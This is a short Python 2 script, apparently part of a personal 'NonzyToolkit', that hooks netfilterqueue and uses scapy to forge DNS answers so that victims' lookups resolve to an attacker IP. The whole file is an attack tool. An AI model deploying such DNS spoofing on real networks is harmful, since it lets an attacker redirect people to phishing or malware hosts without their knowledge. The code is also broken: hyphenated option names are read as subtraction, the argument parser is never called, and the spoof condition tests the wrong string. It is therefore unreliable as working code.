#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import optparse
import pyfiglet 
from termcolor import colored

banner = pyfiglet.figlet_format("NonzyToolkit")
print colored("=" * 60, "green")
print colored(banner, "yellow")
print colored("=" * 60, "green")

#function to parse on terminal.....
def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("-a", "--attacker-ip", dest="attacker-ip", help="attacker-ip") 
	(options, arguments) = parser.parse_args()
		
	if not options.target-ip:
		parser.error("An IP is reqiured")	
	
	return options

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if options.attacker-ip in qname:
			print colored("[+]Spoofing target >>>", "green")
			response = scapy.DNSRR(rrname=qname, rdata=options.attacker-ip)
			scapy_packet[scapy.DNS].an = response
			scapy_packet[scapy.DNS].ancount = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			
			packet.set_payload(str(scapy_packet))
		
	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()